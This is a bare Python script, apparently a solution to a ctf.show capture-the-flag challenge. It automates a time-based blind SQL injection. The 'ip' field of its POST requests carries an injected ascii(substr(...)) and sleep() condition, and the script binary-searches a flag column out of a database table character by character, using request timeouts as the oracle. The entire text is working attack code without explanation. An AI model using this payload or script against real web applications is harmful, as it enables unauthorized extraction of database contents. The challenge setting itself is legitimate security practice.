import requests
url = 'http://cce5695a-4187-4c62-9e84-e684dbfa8fbb.challenge.ctf.show/api/index.php'
flag = ''
for i in range(60):
    lenth = len(flag)
    min,max = 32,128
    while True:
        j = min + (max-min)//2
        if(min == j):
            flag += chr(j)
            print(flag)
            break

        payload = {"ip":f"'') or if(ascii(substr((select group_concat(flagaac) from ctfshow_flagxcc),{i},1))<{j},sleep(0.3),1)#"
                   ,'debug':0}

        try:
            r = requests.post(url=url,data=payload,timeout=0.29)
            min = j
        except:
            max = j